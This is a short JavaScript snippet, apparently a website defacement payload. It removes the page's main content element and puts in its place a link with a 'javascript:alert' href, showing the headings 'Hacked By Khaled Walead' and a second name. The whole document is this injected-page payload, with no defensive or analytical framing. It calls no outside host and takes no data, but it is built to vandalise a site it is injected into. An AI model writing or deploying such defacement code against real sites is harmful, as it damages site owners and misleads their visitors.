
let main = document.getElementById('main');
   
            let wrapper = document.getElementById('wrapper');
            wrapper.removeChild(main);
            var link = document.createElement('a');
            link.setAttribute('href', 'javascript:alert(`Hacked!`);');

            var header1 = document.createElement('h1');
            header1.innerHTML = 'Hacked By Khaled Walead';

            var breakElement = document.createElement('br');

            var header5 = document.createElement('h5');
            header5.innerHTML = 'Deema Abo Fool';

            link.appendChild(header1);
            link.appendChild(breakElement);
            link.appendChild(header5);
            wrapper.appendChild(link)
